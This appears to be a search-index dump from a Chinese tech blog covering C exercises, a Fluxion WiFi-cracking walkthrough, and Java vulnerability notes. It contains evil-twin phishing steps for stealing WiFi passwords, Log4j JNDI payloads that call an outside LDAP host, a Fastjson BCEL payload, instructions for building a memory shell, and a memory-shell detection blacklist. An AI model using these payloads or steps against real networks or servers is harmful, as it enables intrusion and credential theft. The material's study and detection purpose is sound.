","date":"2023-11-17","objectID":"/c_language_notes/:13:0","series":null,"tags":["Programing"],"title":"C语言笔记","uri":"/c_language_notes/#131几个综合练习"},{"categories":["Programing"],"content":"\r13.1几个综合练习\r1.求m到n之间整数的和(m","date":"2023-11-17","objectID":"/c_language_notes/:13:0","series":null,"tags":["Programing"],"title":"C语言笔记","uri":"/c_language_notes/#1求m到n之间整数的和mn包括m和n"},{"categories":["Programing"],"content":"\r13.1几个综合练习\r1.求m到n之间整数的和(m","date":"2023-11-17","objectID":"/c_language_notes/:13:0","series":null,"tags":["Programing"],"title":"C语言笔记","uri":"/c_language_notes/#2计算摄氏温度"},{"categories":["Programing"],"content":"\r13.1几个综合练习\r1.求m到n之间整数的和(m","date":"2023-11-17","objectID":"/c_language_notes/:13:0","series":null,"tags":["Programing"],"title":"C语言笔记","uri":"/c_language_notes/#3最大公约数和最小公倍数"},{"categories":["Programing"],"content":"\r13.1几个综合练习\r1.求m到n之间整数的和(m","date":"2023-11-17","objectID":"/c_language_notes/:13:0","series":null,"tags":["Programing"],"title":"C语言笔记","uri":"/c_language_notes/#4统计字符"},{"categories":["Programing"],"content":"\r13.1几个综合练习\r1.求m到n之间整数的和(m","date":"2023-11-17","objectID":"/c_language_notes/:13:0","series":null,"tags":["Programing"],"title":"C语言笔记","uri":"/c_language_notes/#5输出闰年"},{"categories":["Programing"],"content":"\r13.1几个综合练习\r1.求m到n之间整数的和(m","date":"2023-11-17","objectID":"/c_language_notes/:13:0","series":null,"tags":["Programing"],"title":"C语言笔记","uri":"/c_language_notes/#6判断水仙花数"},{"categories":["Programing"],"content":"\r2023六月份希冀在线判题平台样题","date":"2023-11-17","objectID":"/c_language_notes/:14:0","series":null,"tags":["Programing"],"title":"C语言笔记","uri":"/c_language_notes/#2023六月份希冀在线判题平台样题"},{"categories":["Programing"],"content":"\r1.【问题描述】计算摄氏温度：输入华氏温度，输出对应的摄氏温度。计算公式如下： c=5×(f-32)÷9 ​ 其中，c表示摄氏温度，f表示华氏温度，均使用浮点数存储数据。 【输入形式】输入一个温度值。 【输出形式】输出的数值结果前带有字符串“Celsius**=”，输出保留二位小数。** 【样例输入】150 【样例输出】Celsius=65.56 #include\u003cstdio.h\u003e int main(){ double c; double f; scanf(\"%lf\",\u0026f); c=5*(f-32)/9; printf(\"Celsius=%.2lf\",c); return 0; } ","date":"2023-11-17","objectID":"/c_language_notes/:14:1","series":null,"tags":["Programing"],"title":"C语言笔记","uri":"/c_language_notes/#1"},{"categories":["Programing"],"content":"\r2.【问题描述】求给定序列（1+1/2+1/3+……）前n项的和：输入一个正整数n，计算序列1+1/2+1/3+……的前n项之和； 【输入形式】输入一个整数值，输出一个单精度浮点数。 【输出形式】输出n的值，前面包含字符串”n=\"；输出逗号\",\"；输出求和后的结果值，前面包含字符串\"sum=\"，保留7位小数 【样例输入】5 【样例输出】n=5,sum=2.2833335 【补充说明】若结果为总是为1，请仔细思考有关数据类型运算规则的问题。同时思考，若使用双精度浮点输出，结果应该是多少？ #include\u003cstdio.h\u003e int main(){ int n,k=1,i; float sum=0,u; scanf(\"%d\",\u0026n); for(i=0;i\u003cn;i++){ u=1.0/k; sum=sum+u; k++; } printf(\"n=%d,sum=%.7f\",n,sum); return 0; } 这道题最容易出问题的地方在于u=1.0/k,如果写成u=1/k，u的值会被按整型来计算，这样sum的值会恒等于1.0000000 ","date":"2023-11-17","objectID":"/c_language_notes/:14:2","series":null,"tags":["Programing"],"title":"C语言笔记","uri":"/c_language_notes/#2"},{"categories":["Programing"],"content":"\r3.【问题描述】输入一个正整数n（1\u003cn\u003c10），再输入n个整数，存入数组中，再将数组中的数，逆序存放并输出 【输入形式】先输入一个整数n，再输入n个整数，用空格间隔 【输出形式】输出n个整数，用空格间隔 【样例输入】 5 1 2 3 4 5 【样例输出】 5 4 3 2 1 #include\u003cstdio.h\u003e int main(){ int n,i; int a[10]; scanf(\"%d\",\u0026n); for(i=0;i\u003cn;i++){ scanf(\"%d\",\u0026a[i]); } for(i=n-1;i\u003e=0;i--){ printf(\"%d \",a[i]); } return 0; } ","date":"2023-11-17","objectID":"/c_language_notes/:14:3","series":null,"tags":["Programing"],"title":"C语言笔记","uri":"/c_language_notes/#3"},{"categories":["Programing"],"content":"\r4.【问题描述】输入一个正整数n，再输入n个整数，输出其中最小的值。 【输入形式】先输入一个整数n，再根据n，输入n个数 【输出形式】输出最小值，形式：min=？ 【样例输入】 5 10 22 4 67 2 【样例输出】 min=2 #include\u003cstdio.h\u003e int main(){ int n,i,min; scanf(\"%d\",\u0026n); int a[n]; for(i=0;i\u003cn;i++){ scanf(\"%d\",\u0026a[i]); } min=a[0]; for(i=1;i\u003cn;i++){ if(a[i]\u003cmin){ min=a[i]; } } printf(\"min=%d\",min); return 0; } ","date":"2023-11-17","objectID":"/c_language_notes/:14:4","series":null,"tags":["Programing"],"title":"C语言笔记","uri":"/c_language_notes/#4"},{"categories":["Programing"],"content":"\r5.【问题描述】比较大小：输入三个整数，按从小到大顺序输出。 【输入形式】三个整数，以单个空格分隔 【输出形式】三个整数，以单个空格分隔，由小到大输出 【样例输入】2 6 5 【样例输出】2 5 6 c语言非指针题解 #include\u003cstdio.h\u003e int main(){ int a,b,c,q,w,e; scanf(\"%d %d %d\",\u0026a,\u0026b,\u0026c); if(a\u003cb){ if(a\u003cc){ q=a; if(b\u003cc){ w=b; e=c; }else{ w=c; e=b; } }else{ q=c; w=b; e=a; } }else{ if(c\u003ea){ q=b; w=a; e=c; }else{ if(b\u003ec){ q=c; w=b; e=a; }else{ q=b; w=c; e=a; } } } printf(\"%d %d %d\",q,w,e); return 0; } c语言指针题解 #include \u003cstdio.h\u003e void swap(int* a, int* b) { int temp = *a; *a = *b; *b = temp; } void sort(int* nums, int size) { for (int i = 0; i \u003c size - 1; i++) { for (int j = 0; j \u003c size - i - 1; j++) { if (nums[j] \u003e nums[j + 1]) { swap(\u0026nums[j], \u0026nums[j + 1]); } } } } int main() { int nums[3]; scanf(\"%d %d %d\", \u0026nums[0], \u0026nums[1], \u0026nums[2]); sort(nums, 3); printf(\"%d %d %d\\n\", nums[0], nums[1], nums[2]); return 0; } c++解法(题目莫名其妙非让用c++，我也不怎么会，用ChatGPT帮忙写的) #include\u003ciostream\u003e using namespace std; int main() { int a, b, c; cin \u003e\u003e a \u003e\u003e b \u003e\u003e c; if (a \u003e b) { swap(a, b); } if (a \u003e c) { swap(a, c); } if (b \u003e c) { swap(b, c); } cout \u003c\u003c a \u003c\u003c \" \" \u003c\u003c b \u003c\u003c \" \" \u003c\u003c c \u003c\u003c endl; return 0; } ","date":"2023-11-17","objectID":"/c_language_notes/:14:5","series":null,"tags":["Programing"],"title":"C语言笔记","uri":"/c_language_notes/#5"},{"categories":["Programing"],"content":"\r程序片段编程题","date":"2023-11-17","objectID":"/c_language_notes/:0:0","series":null,"tags":["Programing"],"title":"C语言笔记","uri":"/c_language_notes/#程序片段编程题"},{"categories":["Programing"],"content":"\r1.【问题描述】给定平面上任意两点坐标(x1,y1)和(x2,y2)，求这两点之间的距离（保留两位小数）。要求定义和调用函数dist(x1,y1,x2,y2)计算两点间的距离。 根据程序中的提示，在对应位置编写相关函数及内容。 #include\u003cstdio.h\u003e #include\u003cmath.h\u003e float dist(float xs,float ys,float xe,float ye){ float sum; sum=sqrt(pow((ye-ys),2)+pow((xe-xs),2)); return sum; } int main(){ float xs,ys,xe,ye,d; scanf(\"%f%f\",\u0026xs,\u0026ys); scanf(\"%f%f\",\u0026xe,\u0026ye); d=dist(xs,ys,xe,ye); printf(\"Distance=%.2f\",d); return 0; } 这个题要注意pow函数和sqrt函数的用法 pow() 函数用来求 x 的 y 次幂（次方），pow(x,y) sqrt()函数用来求一个非负实数平方根 ","date":"2023-11-17","objectID":"/c_language_notes/:0:1","series":null,"tags":["Programing"],"title":"C语言笔记","uri":"/c_language_notes/#1-1"},{"categories":["penetration"],"content":"破解WiFi的瑞士军刀 **首先声明：**工具经过我多次实测过，验证了很多网传的教程，大多数是正确的，但也有些不是很合理的指导步骤，或者说是文章作者不加验证和修改地抄别人文章。确实，在这个圈子里很多技术帖都是传来传去，抄来抄去，但我觉得，抄文章应在学习的同时加以验证和修改一些前人不妥的地方，由于时间和个人水平的限制，本文章有些截图和内容来源于他人文章，所以会造成前后图片中SSID不一致的情况，但并不影响阅读和实践。 私自破解他人 WiFi 属于违法行为，我这里使用的是自己买的 迷你版路由器 作为学习和测试。明白了破解原理就知道应该怎么防范了。 ","date":"2023-11-17","objectID":"/fluxion/:0:0","series":null,"tags":["penetration"],"title":"fluxion","uri":"/fluxion/#"},{"categories":["penetration"],"content":"\r0x1-Fluxion是什么Fluxion是一个无线破解工具，这款软件可以帮你挤掉WiFi主人的网络让你自己登陆进去，而且WiFi主人怎么挤也挤不过你。 ","date":"2023-11-17","objectID":"/fluxion/:1:0","series":null,"tags":["penetration"],"title":"fluxion","uri":"/fluxion/#0x1-fluxion是什么"},{"categories":["penetration"],"content":"\r0x2-Fluxion工作原理　1.扫描能够接收到的WIFI信号 2.抓取握手包(这一步的目的是为了验证WiFi密码是否正确) 3.使用WEB接口 4.启动一个假的AP实例来模拟原本的接入点 5.然后会生成一个MDK3进程。如果普通用户已经连接到这个WiFi，也会输入WiFi密码 6.随后启动一个模拟的DNS服务器并且抓取所有的DNS请求，并且会把这些请求重新定向到一个含有恶意脚本的HOST地址 7.随后会弹出一个窗口提示用户输入正确的WiFi密码 8.用户输入的密码将和第二步抓到的握手包做比较来核实密码是否正确 ","date":"2023-11-17","objectID":"/fluxion/:2:0","series":null,"tags":["penetration"],"title":"fluxion","uri":"/fluxion/#0x2-fluxion工作原理"},{"categories":["penetration"],"content":"\r0x3-Fluxion的安装在终端输入以下命令安装fluxion： git clone https://github.com/deltaxflux/fluxion.git 随后通过终端进入到fluxion目录 Tips：不同版本的kali情况可能不同，但首次需要使用通过./fluxion.sh -i 来安装kali缺少的工具 ","date":"2023-11-17","objectID":"/fluxion/:3:0","series":null,"tags":["penetration"],"title":"fluxion","uri":"/fluxion/#0x3-fluxion的安装"},{"categories":["penetration"],"content":"\r0x4-Fluxion的使用 cd fluxion ./fluxion.sh 在语言选择界面直接选中文就好了，6.9版本的选18，注意不要输入018 接下来进入主界面： 首先我们选择2，先扫描并抓取WiFi信息，虽然网上有些教程说是先选1，但其实并不正确。 可以看到左边终端窗口显示扫描到的一些热点，当目标信号出现后，可按ctl+c返回原界面，当然也可以按两次q键。 输入编号选中要攻击的信号节点 输入2跳过 选择2，因为之前有攻击过一次，抓到了握手包 选择2 选择2 选择1 选择2 开始抓去握手包… 出现如图所示，则抓包成功，这个包是后续用来检测密码的。当然也可对其进行其他的一些研究和操作，接着选择1，启动攻击 接着回到刚开始的界面，这里我们要选择1，因为我们已经抓到包了 这里继续选择2，选择1，后面的钓鱼热点就开不开了 这里选择2 选择1的话网上说所有人都会连不上，我试过了，确实是这样的 选择推荐的1，开始建立AP 选择1 选择1，这个抓取到的hash文件就是我们刚才抓到的包 选择推荐的2 选择1 选择推荐的1 这个工具的工作原理是，把原来的WiFi打掉，然后建立一个同名热点，你连接上这个热点后，他会弹出你选择的认证界面，提示你重新输入密码，你输入的密码他会去根据抓到的包进行验证，密码正确就保存密码，关闭钓鱼热点，密码错误就继续让你输入。 下面还有很多界面种类，这里选3中文认证界面，这个界面是可以自己建立的钓鱼WiFi的认证界面，但是我不会，应该是用一个什么软件建立了一个界面，然后在特定的文件夹里添加上，如果不会建立界面，就用它自带的即可。 选择后开始建立钓鱼热点，出现六个小窗口，原来的WiFi就连接不上了，我们的钓鱼WiFi出现了，当连接同名钓鱼WiFi时就会弹出认证窗口。 注意，这时候所选择的设备是早已经连上目标WiFi的，我是用自己手机连着实验室的bamboo的。 可以看到，我手机上提示了密码错误，以及出现了两个bamboo。 真正的WiFi会一直无法连接，同时会有一个一模一样未加密的伪AP，手机连上伪AP，输入密码后正确密码保存在netlog文件夹中，错误密码保存在pwdlog文件夹中 以下是手机连上伪AP后弹出的认证界面，可以看到它要求你输入密码，输入正确密码后会告诉你自动修复。 出现了钓鱼界面，而刚才说的可以自己制作的钓鱼界面就是这个，可以自己根据社工出的路由器牌子制作相应逼真的网站提高钓鱼成功率。 如果成功的话4个窗口会消失，如下图 2退出 最终结果： 文件打开后可以看到Password后就是bamboo的密码 另外错误密码的文件夹也能查看 ","date":"2023-11-17","objectID":"/fluxion/:4:0","series":null,"tags":["penetration"],"title":"fluxion","uri":"/fluxion/#0x4-fluxion的使用"},{"categories":["hvv"],"content":"HVV专题–java类漏洞 ","date":"2023-11-17","objectID":"/hvv_java/:0:0","series":null,"tags":["hvv"],"title":"hvv_Java","uri":"/hvv_java/#"},{"categories":["hvv"],"content":"\rjava","date":"2023-11-17","objectID":"/hvv_java/:0:0","series":null,"tags":["hvv"],"title":"hvv_Java","uri":"/hvv_java/#java"},{"categories":["hvv"],"content":"\r代码审计漏洞java代码审计 - 先知社区 (aliyun.com) ","date":"2023-11-17","objectID":"/hvv_java/:0:1","series":null,"tags":["hvv"],"title":"hvv_Java","uri":"/hvv_java/#代码审计漏洞"},{"categories":["hvv"],"content":"\rjava实现RCE的函数Runtime.getRuntime.exec(“cmd”) new ProcessBuilder().start(“cmd”) ","date":"2023-11-17","objectID":"/hvv_java/:0:2","series":null,"tags":["hvv"],"title":"hvv_Java","uri":"/hvv_java/#java实现rce的函数"},{"categories":["hvv"],"content":"\rLog4J漏洞有深入了解吗？再正常的log处理过程中会对${内部字符进行检查,如果以但匹配到类似于表达式结构的字符串就会触发替换机制,将表达式的内容替换成为表达式解析后的内容,而不是表达式本身,从而导致攻击者构造符合要求的表达式供系统执行,漏洞成因, **特征:**在打印日志的时候,如果日志内容包含关键字${,那么攻击者就能把关键字包含的内容当作变量来替换成任何的攻击命令 ${jndi:ldap://xxx.xxx.xxx.xxx/exp} 第一步：向目标发送指定 payload，目标对 payload 进行解析执行，然后会通过 ldap 链接远程服务，当 ldap 服务收到请求之后，将请求进行重定向到恶意 java class 的地址 第二步：目标服务器收到重定向请求之后，下载恶意 class 并执行其中的代码，从而执行系统命令 ${jndi:ldap://${sys:java.version}.collaborator.com} ladp注入原理1.使用了lookup 2.lookup的参数动态可控 3.构建一个ldap服务，指定远程加载地址为恶意代码地址 4.在客户端访问ldap服务不存在的对象 5.客户端下载恶意代码到本地并执行 rmi具体过程远端方法调用（Remote Method Invocation） Server端监听一个端口，这个端口是JVM随机选择的； Client端并不知道Server远程对象的通信地址和端口，但是Stub中包含了这些信息，并封装了底层网络操作； Client端可以调用Stub上的方法； Stub连接到Server端监听的通信端口并提交参数； 远程Server端上执行具体的方法，并返回结果给Stub； Stub返回执行结果给Client端，从Client看来就好像是Stub在本地执行了这个方法一样； ","date":"2023-11-17","objectID":"/hvv_java/:0:3","series":null,"tags":["hvv"],"title":"hvv_Java","uri":"/hvv_java/#log4j漏洞有深入了解吗"},{"categories":["hvv"],"content":"\rLog4J漏洞有深入了解吗？再正常的log处理过程中会对${内部字符进行检查,如果以但匹配到类似于表达式结构的字符串就会触发替换机制,将表达式的内容替换成为表达式解析后的内容,而不是表达式本身,从而导致攻击者构造符合要求的表达式供系统执行,漏洞成因, **特征:**在打印日志的时候,如果日志内容包含关键字${,那么攻击者就能把关键字包含的内容当作变量来替换成任何的攻击命令 ${jndi:ldap://xxx.xxx.xxx.xxx/exp} 第一步：向目标发送指定 payload，目标对 payload 进行解析执行，然后会通过 ldap 链接远程服务，当 ldap 服务收到请求之后，将请求进行重定向到恶意 java class 的地址 第二步：目标服务器收到重定向请求之后，下载恶意 class 并执行其中的代码，从而执行系统命令 ${jndi:ldap://${sys:java.version}.collaborator.com} ladp注入原理1.使用了lookup 2.lookup的参数动态可控 3.构建一个ldap服务，指定远程加载地址为恶意代码地址 4.在客户端访问ldap服务不存在的对象 5.客户端下载恶意代码到本地并执行 rmi具体过程远端方法调用（Remote Method Invocation） Server端监听一个端口，这个端口是JVM随机选择的； Client端并不知道Server远程对象的通信地址和端口，但是Stub中包含了这些信息，并封装了底层网络操作； Client端可以调用Stub上的方法； Stub连接到Server端监听的通信端口并提交参数； 远程Server端上执行具体的方法，并返回结果给Stub； Stub返回执行结果给Client端，从Client看来就好像是Stub在本地执行了这个方法一样； ","date":"2023-11-17","objectID":"/hvv_java/:0:3","series":null,"tags":["hvv"],"title":"hvv_Java","uri":"/hvv_java/#ladp注入原理"},{"categories":["hvv"],"content":"\rLog4J漏洞有深入了解吗？再正常的log处理过程中会对${内部字符进行检查,如果以但匹配到类似于表达式结构的字符串就会触发替换机制,将表达式的内容替换成为表达式解析后的内容,而不是表达式本身,从而导致攻击者构造符合要求的表达式供系统执行,漏洞成因, **特征:**在打印日志的时候,如果日志内容包含关键字${,那么攻击者就能把关键字包含的内容当作变量来替换成任何的攻击命令 ${jndi:ldap://xxx.xxx.xxx.xxx/exp} 第一步：向目标发送指定 payload，目标对 payload 进行解析执行，然后会通过 ldap 链接远程服务，当 ldap 服务收到请求之后，将请求进行重定向到恶意 java class 的地址 第二步：目标服务器收到重定向请求之后，下载恶意 class 并执行其中的代码，从而执行系统命令 ${jndi:ldap://${sys:java.version}.collaborator.com} ladp注入原理1.使用了lookup 2.lookup的参数动态可控 3.构建一个ldap服务，指定远程加载地址为恶意代码地址 4.在客户端访问ldap服务不存在的对象 5.客户端下载恶意代码到本地并执行 rmi具体过程远端方法调用（Remote Method Invocation） Server端监听一个端口，这个端口是JVM随机选择的； Client端并不知道Server远程对象的通信地址和端口，但是Stub中包含了这些信息，并封装了底层网络操作； Client端可以调用Stub上的方法； Stub连接到Server端监听的通信端口并提交参数； 远程Server端上执行具体的方法，并返回结果给Stub； Stub返回执行结果给Client端，从Client看来就好像是Stub在本地执行了这个方法一样； ","date":"2023-11-17","objectID":"/hvv_java/:0:3","series":null,"tags":["hvv"],"title":"hvv_Java","uri":"/hvv_java/#rmi具体过程"},{"categories":["hvv"],"content":"\r讲一下fastjsonFastjson提供了autotype功能再处理json的时候,允许用户在反序列化数据中通过“@type”指定反序列化的Class类型，没有对指定恶意代码Class的@Type， 服务端调用JSON.parseObject()时触发了该Class中的构造函数、或者是getter、setter方法中的恶意代码 ,远程连接rmi主机，反弹shell之类的操作 { { \"x\":{ \"@type\": \"org.apache.tomcat.dbcp.dbcp2.BasicDataSource\", \"driverClassLoader\": { \"@type\": \"com.sun.org.apache.bcel.internal.util.ClassLoader\" }, \"driverClassName\": \"$$BCEL$$$l$8b$I$A$...\" } }: \"x\" } ","date":"2023-11-17","objectID":"/hvv_java/:0:4","series":null,"tags":["hvv"],"title":"hvv_Java","uri":"/hvv_java/#讲一下fastjson"},{"categories":["hvv"],"content":"\rcc链的4种transformerCC链 1-7 分析 - 先知社区 (aliyun.com) ","date":"2023-11-17","objectID":"/hvv_java/:0:5","series":null,"tags":["hvv"],"title":"hvv_Java","uri":"/hvv_java/#cc链的4种transformer"},{"categories":["hvv"],"content":"\rshrio反序列化Apache Shiro框架提供了记住我的功能（RememberMe），用户登陆成功后会生成经过加密并编码的cookie，在服务端接收cookie值后，Base64解码–\u003eAES解密–\u003e反序列化。攻击者只要找到AES加密的密钥，就可以构造一个恶意对象，对其进行序列化–\u003eAES加密–\u003eBase64编码，然后将其作为cookie的rememberMe字段发送，Shiro将rememberMe进行解密并且反序列化，最终造成反序列化漏洞。 Shiro \u003c 1.2.4版本会存在此漏洞，挖掘的时候删除请求包中的rememberMe参数，返回包中包含rememberMe=deleteMe字段。说明使用了shiro组件，可以尝试此漏洞。 如果返回包无此字段，可以通过在发送数据包的cookie中增加字段：****rememberMe=，然后查看返回数据包中是否存在关键字 此漏洞有两个版本利用方式， SHIRO-550： 不需要提供秘钥，使用默认秘钥就可以利用 SHIRO-721: 先爆破秘钥，成功后可以进一步利用 ","date":"2023-11-17","objectID":"/hvv_java/:0:6","series":null,"tags":["hvv"],"title":"hvv_Java","uri":"/hvv_java/#shrio反序列化"},{"categories":["hvv"],"content":"\rspring漏洞\r","date":"2023-11-17","objectID":"/hvv_java/:0:7","series":null,"tags":["hvv"],"title":"hvv_Java","uri":"/hvv_java/#spring漏洞"},{"categories":["hvv"],"content":"\rjava执行无回显dnslog、当前环境中找响应对象、抛出异常、web目录里写入html Java 反序列化回显的多种姿势 - 先知社区 (aliyun.com) ","date":"2023-11-17","objectID":"/hvv_java/:0:8","series":null,"tags":["hvv"],"title":"hvv_Java","uri":"/hvv_java/#java执行无回显"},{"categories":["hvv"],"content":"\r内存马查杀","date":"2023-11-17","objectID":"/hvv_java/:0:9","series":null,"tags":["hvv"],"title":"hvv_Java","uri":"/hvv_java/#内存马查杀"},{"categories":["hvv"],"content":"\r内存马的分类 servlet-api类 filter型 servlet型 spring类 拦截器 controller型 java Instrumentation类 agent型 filter内存马 创建一个恶意 Filter 利用 FilterDef 对 Filter 进行一个封装 将 FilterDef 添加到 FilterDefs 和 FilterConfig 创建 FilterMap ，将我们的 Filter 和 urlpattern 相对应，存放到 filterMaps中（由于 Filter 生效会有一个先后顺序，所以我们一般都是放在最前面，让我们的 Filter 最先触发） ","date":"2023-11-17","objectID":"/hvv_java/:0:10","series":null,"tags":["hvv"],"title":"hvv_Java","uri":"/hvv_java/#内存马的分类"},{"categories":["hvv"],"content":"\r内存马的分类 servlet-api类 filter型 servlet型 spring类 拦截器 controller型 java Instrumentation类 agent型 filter内存马 创建一个恶意 Filter 利用 FilterDef 对 Filter 进行一个封装 将 FilterDef 添加到 FilterDefs 和 FilterConfig 创建 FilterMap ，将我们的 Filter 和 urlpattern 相对应，存放到 filterMaps中（由于 Filter 生效会有一个先后顺序，所以我们一般都是放在最前面，让我们的 Filter 最先触发） ","date":"2023-11-17","objectID":"/hvv_java/:0:10","series":null,"tags":["hvv"],"title":"hvv_Java","uri":"/hvv_java/#filter内存马"},{"categories":["hvv"],"content":"\r查杀思路利用java agent技术遍历所有已经加载到内存中的class,先判断是否是内存马,是则进入内存查杀 ","date":"2023-11-17","objectID":"/hvv_java/:0:11","series":null,"tags":["hvv"],"title":"hvv_Java","uri":"/hvv_java/#查杀思路"},{"categories":["hvv"],"content":"\r内存马的识别\rfilter名字很特别内存马的filter名一般比较特别,有shell或者随机数等关键字.这个特征较弱,因为这取决于内存马的构造者的习惯,构造完全可以设置一个看起来很正常的名字 filter优先级是第一位为了确保内存马在各种环境下都可以访问,往往需要把filter匹配优先级调至最高,这在shiro反序列化中是刚需.但是在其他场景之下就非必须,之能作为一个可疑点 对比web.xml中没有filter配置由于内存马的filter是动态注册的,所以在web.xml中肯定没有配置,这个是个可以的特征.但servlet 3.0引入了@WebFiler标签方便开发这个动态注册filter.这种情况也存在没有在web.xml中显式声明,这个特征可以作为较强的特征. 特殊class loader加载我们都知道filter也是class,也是必须有特定的class loader加载.正常的filter都是由中间件的webappclassloader加载的.反序列化漏洞喜欢利用Templatesimpl和bcel执行任意代码.所以这些class往往就是下面这两个 com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl$TransletClassLoader com.sun.org.apache.bcel.internal.util.ClassLoader 这个特征是一个特别可疑的点.有的内存马还是比较狡猾的,他会注入class到当前线程中,然后实例化注入内存马.这个时候内存马就有可能不是上面的两个classloader 对应的classloader路径下面没有class文件所谓内存马就是代码驻留在内存中,本地无对应的class文件,所以我们只要检测filter对应的classloader目录下是否存在class文件 dilter的dofilter方法中有恶意代码我们可把内存中所有的filter的class dump出来,使用fernflower等反编译工具分析看看,是否存在恶意代码,，比如调用了如下可疑的方法： java.lang.Runtime.getRuntime defineClass invoke … 总的来讲这两类,也就是说filter型内存马首先是一个filter类,同时它在硬盘上没有对应的class文件。若dump出的class还有恶意代码，那是内存马无疑啦 检查思路抽象如下 private static boolean isMemshell(Class targetClass,byte[] targetClassByte){ ClassLoader classLoader = null; if(targetClass.getClassLoader() != null) { classLoader = targetClass.getClassLoader(); }else{ classLoader = Thread.currentThread().getContextClassLoader(); } Class clsFilter = null; try { clsFilter = classLoader.loadClass(\"javax.servlet.Filter\"); }catch (Exception e){ } // 是否是filter if(clsFilter != null \u0026\u0026 clsFilter.isAssignableFrom(targetClass)){ // class loader 是不是Templates或bcel if(classLoader.getClass().getName().contains(\"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl$TransletClassLoader\") || classLoader.getClass().getName().contains(\"com.sun.org.apache.bcel.internal.util.ClassLoader\")){ return true; } // 是否存在ClassLoader的文件目录下存在对应的class文件 if(classFileIsExists(targetClass)){ return true; } // filter是否包含恶意代码。 String[] blacklist = new String[]{\"getRuntime\",\"defineClass\",\"invoke\"}; String clsJavaCode = FernflowerUtils.decomper(targetClass,targetClassByte); for(String b:blacklist){ if(clsJavaCode.contains(b)){ return true; } } }else{ return false; } return false; } ","date":"2023-11-17","objectID":"/hvv_java/:0:12","series":null,"tags":["hvv"],"title":"hvv_Java","uri":"/hvv_java/#内存马的识别"},{"categories":["hvv"],"content":"\r内存马的识别\rfilter名字很特别内存马的filter名一般比较特别,有shell或者随机数等关键字.这个特征较弱,因为这取决于内存马的构造者的习惯,构造完全可以设置一个看起来很正常的名字 filter优先级是第一位为了确保内存马在各种环境下都可以访问,往往需要把filter匹配优先级调至最高,这在shiro反序列化中是刚需.但是在其他场景之下就非必须,之能作为一个可疑点 对比web.xml中没有filter配置由于内存马的filter是动态注册的,所以在web.xml中肯定没有配置,这个是个可以的特征.但servlet 3.0引入了@WebFiler标签方便开发这个动态注册filter.这种情况也存在没有在web.xml中显式声明,这个特征可以作为较强的特征. 特殊class loader加载我们都知道filter也是class,也是必须有特定的class loader加载.正常的filter都是由中间件的webappclassloader加载的.反序列化漏洞喜欢利用Templatesimpl和bcel执行任意代码.所以这些class往往就是下面这两个 com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl$TransletClassLoader com.sun.org.apache.bcel.internal.util.ClassLoader 这个特征是一个特别可疑的点.有的内存马还是比较狡猾的,他会注入class到当前线程中,然后实例化注入内存马.这个时候内存马就有可能不是上面的两个classloader 对应的classloader路径下面没有class文件所谓内存马就是代码驻留在内存中,本地无对应的class文件,所以我们只要检测filter对应的classloader目录下是否存在class文件 dilter的dofilter方法中有恶意代码我们可把内存中所有的filter的class dump出来,使用fernflower等反编译工具分析看看,是否存在恶意代码,，比如调用了如下可疑的方法： java.lang.Runtime.getRuntime defineClass invoke … 总的来讲这两类,也就是说filter型内存马首先是一个filter类,同时它在硬盘上没有对应的class文件。若dump出的class还有恶意代码，那是内存马无疑啦 检查思路抽象如下 private static boolean isMemshell(Class targetClass,byte[] targetClassByte){ ClassLoader classLoader = null; if(targetClass.getClassLoader() != null) { classLoader = targetClass.getClassLoader(); }else{ classLoader = Thread.currentThread().getContextClassLoader(); } Class clsFilter = null; try { clsFilter = classLoader.loadClass(\"javax.servlet.Filter\"); }catch (Exception e){ } // 是否是filter if(clsFilter != null \u0026\u0026 clsFilter.isAssignableFrom(targetClass)){ // class loader 是不是Templates或bcel if(classLoader.getClass().getName().contains(\"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl$TransletClassLoader\") || classLoader.getClass().getName().contains(\"com.sun.org.apache.bcel.internal.util.ClassLoader\")){ return true; } // 是否存在ClassLoader的文件目录下存在对应的class文件 if(classFileIsExists(targetClass)){ return true; } // filter是否包含恶意代码。 String[] blacklist = new String[]{\"getRuntime\",\"defineClass\",\"invoke\"}; String clsJavaCode = FernflowerUtils.decomper(targetClass,targetClassByte); for(String b:blacklist){ if(clsJavaCode.contains(b)){ return true; } } }else{ return false; } return false; } ","date":"2023-11-17","objectID":"/hvv_java/:0:12","series":null,"tags":["hvv"],"title":"hvv_Java","uri":"/hvv_java/#filter名字很特别"},{"categories":["hvv"],"content":"\r内存马的识别\rfilter名字很特别内存马的filter名一般比较特别,有shell或者随机数等关键字.这个特征较弱,因为这取决于内存马的构造者的习惯,构造完全可以设置一个看起来很正常的名字 filter优先级是第一位为了确保内存马在各种环境下都可以访问,往往需要把filter匹配优先级调至最高,这在shiro反序列化中是刚需.但是在其他场景之下就非必须,之能作为一个可疑点 对比web.xml中没有filter配置由于内存马的filter是动态注册的,所以在web.xml中肯定没有配置,这个是个可以的特征.但servlet 3.0引入了@WebFiler标签方便开发这个动态注册filter.这种情况也存在没有在web.xml中显式声明,这个特征可以作为较强的特征. 特殊class loader加载我们都知道filter也是class,也是必须有特定的class loader加载.正常的filter都是由中间件的webappclassloader加载的.反序列化漏洞喜欢利用Templatesimpl和bcel执行任意代码.所以这些class往往就是下面这两个 com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl$TransletClassLoader com.sun.org.apache.bcel.internal.util.ClassLoader 这个特征是一个特别可疑的点.有的内存马还是比较狡猾的,他会注入class到当前线程中,然后实例化注入内存马.这个时候内存马就有可能不是上面的两个classloader 对应的classloader路径下面没有class文件所谓内存马就是代码驻留在内存中,本地无对应的class文件,所以我们只要检测filter对应的classloader目录下是否存在class文件 dilter的dofilter方法中有恶意代码我们可把内存中所有的filter的class dump出来,使用fernflower等反编译工具分析看看,是否存在恶意代码,，比如调用了如下可疑的方法： java.lang.Runtime.getRuntime defineClass invoke … 总的来讲这两类,也就是说filter型内存马首先是一个filter类,同时它在硬盘上没有对应的class文件。若dump出的class还有恶意代码，那是内存马无疑啦 检查思路抽象如下 private static boolean isMemshell(Class targetClass,byte[] targetClassByte){ ClassLoader classLoader = null; if(targetClass.getClassLoader() != null) { classLoader = targetClass.getClassLoader(); }else{ classLoader = Thread.currentThread().getContextClassLoader(); } Class clsFilter = null; try { clsFilter = classLoader.loadClass(\"javax.servlet.Filter\"); }catch (Exception e){ } // 是否是filter if(clsFilter != null \u0026\u0026 clsFilter.isAssignableFrom(targetClass)){ // class loader 是不是Templates或bcel 